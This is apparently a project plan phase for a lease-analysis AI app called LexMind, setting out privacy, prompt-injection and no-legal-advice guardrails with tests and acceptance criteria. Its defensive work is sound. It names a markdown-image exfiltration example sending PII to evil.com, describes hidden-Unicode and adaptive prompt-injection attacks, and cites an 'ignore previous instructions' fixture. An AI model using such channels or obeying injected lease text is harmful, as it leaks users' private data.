# Phase 05 — Safety, Privacy & Responsible-AI Guardrails

**Goal:** make LexMind safe to hand a real person's lease — a document that is simultaneously the
user's most private data *and* fully untrusted adversarial input — and make the "information, not
advice" boundary a property of the system rather than a sentence in the footer.

**Depends on:** 02 (ingest), 04 (model port).
**Blocks:** 06, 07, 08, 09 — nothing calls the model without passing through this layer.

**Judged axes earned here:** Security (the whole axis), Problem Alignment (the no-advice boundary
is the problem statement's explicit constraint).

---

## The finding that shapes this phase

Google's **Gemini API Additional Terms** state, verbatim, for the unpaid tier:

> **"Do not submit sensitive, confidential, or personal information to the Unpaid Services."**
> "Google uses the content you submit … to provide, improve, and develop Google products and
> services **and machine learning technologies**."
> "To help with quality and improve our products, **human reviewers may read, annotate, and process
> your API input and output**."

A free AI Studio key receiving raw lease agreements — names, addresses, ID numbers, bank details —
**violates the provider's own terms of use**. This is not a theoretical risk; it is a documented
prohibition, and a security reviewer can check it in one click.

**Decision: the model never sees raw PII.** Redaction is not a nice-to-have bolted on at the end;
it is the boundary condition the whole pipeline is built around. That turns the constraint into the
product's strongest privacy story rather than its worst finding.

---

## Deliverables

```
packages/core/src/safety/
  redact.ts            PII detection -> consistent surrogates, reversible in-process
  surrogates.ts        the surrogate map; NEVER serialised, NEVER sent, NEVER logged
  unicode.ts           invisible-character stripping
  injection.ts         document/instruction separation + provenance labelling
  boundary.ts          the no-advice classifier + refusal/escalation responses
  jurisdiction.ts      jurisdiction detection + honest coverage disclaimers
  disclosure.ts        the AI-disclosure copy used before first interaction
  limits.ts            size, page, and token ceilings
  *.test.ts            one test file per module, adversarial fixtures
test/fixtures/adversarial/
  injected-lease.txt   a lease with "ignore previous instructions" in body text
  invisible-unicode.txt  tag-block + zero-width instruction payload
  pii-dense.txt        names, addresses, national IDs, bank details
docs/SECURITY.md       threat model, controls, and residual risk — stated honestly
```

## Tasks

### Prompt injection — treat it as architecture, not a filter

- [ ] **Adopt the correct mental model up front.** OWASP's 2026 LLM01 states that LLMs make no
      architectural distinction between instructions and data, that **"no reliable prevention
      mechanism exists today"**, and that **"defense is therefore architectural rather than
      interceptive."** Design on the explicit assumption that the instruction boundary will
      eventually be bypassed.
- [ ] **Close the lethal trifecta.** The three legs are: access to private data, exposure to
      untrusted content, and **the ability to externally communicate**. LexMind inherently has the
      first two — *they are the same document*. Our entire posture rests on never granting the third:
      - **no tool calls, no function calling, no agentic loop**
      - **no outbound fetch of any model-provided URL** (this also closes SSRF)
      - **no auto-rendered remote images** — `![](https://evil.com/?d=<pii>)` is a silent
        exfiltration channel. CSP `img-src 'self' data:` enforces it at the browser too.
      This is the single most important security property of the design; say so in `docs/SECURITY.md`.
- [ ] **Strip invisible Unicode at ingest *and* at render.** A PDF can carry instructions that are
      invisible in every viewer: tag-block `U+E0000–U+E007F`, variation selectors `U+FE00–U+FE0F`,
      and zero-width `U+200B U+200C U+200D U+2060`. Normalise NFKC, strip, and unit-test against
      `invisible-unicode.txt`.
- [ ] **Structural separation with provenance labelling** — the document goes in a delimited,
      clearly-marked channel, never concatenated into the instruction text. Be honest in the docs
      that this **reduces attack success in non-adaptive tests only**; an attacker who knows the
      marking scheme can mimic it.
- [ ] **Constrain output structurally, not semantically.** Every model response is schema-validated
      in our own TypeScript. A schema-valid response can still be semantically manipulated — which
      is exactly why the citation verifier (Phase 07) matters more than the schema.
- [ ] **Never claim injection is solved.** Adaptive attacks succeed **>90%** against 12 recent
      published defenses (Nasr et al., 2025), while the same defenses score near zero against static
      corpora. `docs/SECURITY.md` documents defense-in-depth *and residual risk*. A reviewer rewards
      calibration; an overclaim is a red flag.

### PII — redact before transmission

- [ ] **Use consistent, realistic, type-matched surrogates — not `<PERSON>` tokens.** This is the
      subtle part and it decides whether the product still works after redaction:
      - Naive redaction collapses "Mr. Tan", "the Tenant", and "Mr. Tan's spouse" into one token,
        destroying coreference.
      - Worse, **landlord and tenant both become `<PERSON>`** — and a lease *is* a two-party
        obligation matrix. That failure is fatal to the core feature.
      - Fix: map landlord → a stable fake name, tenant → a different stable fake name, **the same
        surrogate every occurrence**, then reverse-map on the way out. Consistency preserves
        coreference; realism keeps the text on-distribution.
- [ ] Layered detection, cheapest first: deterministic validators where they exist (Luhn for cards,
      checksums for IBAN, check-digit-validated national IDs — SG NRIC/FIN, IN Aadhaar/PAN, UK NINO),
      then regex with validation, then name/address heuristics.
- [ ] Base library: **`redact-pii-core`** (maintained TypeScript fork; the original `redact-pii` is
      **deprecated — "Package no longer supported"**). Its built-ins are US-English-centric with no
      recognizer for SG/IN/UK/ZA IDs, so add those as custom redactors **with check-digit validation**,
      not bare shape matches.
- [ ] **State the limits honestly in the README.** Automated PII detection is never a guarantee —
      even a vendor's own favourable figures put name detection F1 at ~87–90%, i.e. roughly **1 in 8
      names missed**, and location recall drops to ~0.46 on out-of-distribution text. Presidio's own
      docs say there is "no guarantee that Presidio will find all sensitive information."
      Redaction is a strong mitigation, not a safety guarantee, and the UI must say so.
- [ ] **The surrogate map never leaves the process.** Not serialised, not logged, not sent to
      Gemini, not persisted. Reversal happens in memory immediately before rendering to the user.
- [ ] **Disclose regardless.** Because redaction is imperfect and the free tier trains on
      submissions, the UI shows an unmissable pre-upload notice stating that document content is
      sent to Google's Gemini API, that on the free tier Google uses it to improve its products and
      human reviewers may read it, and that users should not upload documents they cannot share.
      Ship **synthetic leases** for the demo, and say they are synthetic.

### The no-advice boundary

- [ ] **Encode the information/advice line as product rules**, not prose. The regulated act is
      *applying law to a specific person's facts and recommending a course of action*. So:
      | Allowed | Refused, with escalation |
      |---|---|
      | "This clause says X." | "Should I sign this?" |
      | "Clauses like this commonly mean Y." | "Will I win if I sue?" |
      | "Deposit caps vary by jurisdiction; here is the general rule." | "Is this clause enforceable in my case?" |
      | "Here are questions to ask a lawyer." | "Draft a termination notice for me." |
- [ ] `boundary.ts` classifies the *request*, not just the output, and returns a structured refusal
      that **redirects usefully** — into the lawyer-prep pack (Phase 09) and jurisdiction resources —
      rather than a flat "I can't help with that." A refusal that leaves the user stuck fails the
      problem statement as surely as over-advising does.
- [ ] **Never predict outcomes, never draft binding documents, never state enforceability for the
      user's specific situation.**
- [ ] **AI disclosure before first interaction.** EU AI Act **Article 50(1)** requires that people
      are informed they are interacting with an AI system, and **50(5)** requires it "at the latest
      at the time of the first interaction," in a clear and distinguishable manner, meeting
      accessibility requirements. Article 50 has been in force since 2 August 2026. Put the
      disclosure on the upload screen, not in a footer.
- [ ] **Calibrate on the real error rates.** Purpose-built legal AI tools (Lexis+ AI, Westlaw AI-AR)
      hallucinate **17–33%** of the time; general LLMs on legal queries **≥58%**. Every output
      carries a verified citation or is not shown. This is the honest justification for the
      citation-verification architecture — put the numbers in the README.
- [ ] **Jurisdiction honesty.** Detect likely jurisdiction from the document; where confident, say
      which rules are being referenced; where not, say so plainly. Never present one jurisdiction's
      rule as universal. Tenancy law is a **state subject in India** and state-level in the US —
      a national answer is often simply wrong.

### Input handling & abuse

- [ ] **Never write the uploaded file to disk.** Parse in memory in the route handler. That single
      decision dominates every storage-location control in the OWASP File Upload Cheat Sheet.
- [ ] Validate type by **magic bytes**, not the `Content-Type` header — OWASP: it "cannot be
      trusted, as it is trivial to spoof." Allowlist extensions. Cap filename length; generate our
      own identifier rather than echoing the user's filename.
- [ ] Hard ceilings, enforced before any model call: max file bytes (note Vercel caps request
      bodies at **4.5 MB**), max pages, max extracted tokens. OWASP **LLM06 Unbounded Consumption**
      names this exact failure "Denial of Wallet."
- [ ] Rate limiting. Be honest about what it is: an in-memory limiter is a **best-effort cost
      speed-bump, not a security control**, because serverless scales to many instances and each has
      its own counter. Use `rate-limiter-flexible`'s `RateLimiterMemory` locally, and the platform
      WAF rate-limit rule when deployed.
- [ ] Never log document text, prompts, or responses. Log token counts, latency, verification
      failure rate, and a hashed document id — nothing else. A log stream containing lease contents
      *is* a data breach.
- [ ] **Never `dangerouslySetInnerHTML` with model output.** The lease is attacker-supplied, so this
      is a direct XSS path. Render Markdown through `react-markdown`, which builds React elements
      and never parses HTML.

## Design notes

- **Why this phase blocks every other model-calling phase:** if guardrails are added at the end,
  they are a wrapper someone forgets to call. Making `safety/` the only path to the model port means
  the safe path is the *only* path.
- The threat model is unusual and worth stating explicitly in `docs/SECURITY.md`: **the private data
  and the untrusted input are the same bytes.** Most LLM security writing assumes those are
  separate. Ours cannot separate them, so we compensate by removing the exfiltration channel
  entirely.
- Frame the free-tier data-use finding as a deliberate, documented trade-off with a mitigation,
  not as something we did not notice. Reviewers reward a team that read the provider's terms.

## Acceptance criteria

- `injected-lease.txt` — the model's instructions are not subverted; the injected sentence is
  reported as *document content*, and a test asserts the analysis output is unchanged in structure.
- `invisible-unicode.txt` — all invisible ranges are stripped at ingest; a test asserts the payload
  never reaches the prompt.
- `pii-dense.txt` — no raw name, address, national ID, or account number appears in the outbound
  prompt. A test asserts this by scanning the serialised request.
- Surrogates are **consistent**: the same landlord name maps to the same surrogate on every
  occurrence, and landlord ≠ tenant surrogate. A test asserts round-trip fidelity.
- Every advice-seeking prompt in the refusal fixture set produces a refusal **plus** a useful
  redirect; no prompt produces an enforceability opinion or a drafted document.
- No code path fetches a URL originating from model output — proven by a grep test.
- `docs/SECURITY.md` documents the threat model, each control, and the residual risk, including the
  free-tier data-use trade-off and the >90% adaptive-attack figure.

## Risks

- **Redaction degrading analysis quality.** This is the real engineering risk, and the surrogate
  strategy is the mitigation. Measure it: run the Phase 11 golden set both redacted and unredacted
  and report the delta rather than assuming it is zero.
- **Over-refusal.** A boundary classifier tuned too tight refuses "what does this clause mean?" and
  destroys the product. Build the refusal fixture set with *both* positive and negative cases, and
  treat a false refusal as a test failure, not a safe default.
- **Jurisdiction misdetection** producing confidently wrong rules. Prefer abstention and a stated
  uncertainty over a guess.
- **Security theatre.** Every control here must be testable. A control that cannot be demonstrated
  in a test is a claim, and claims do not score.
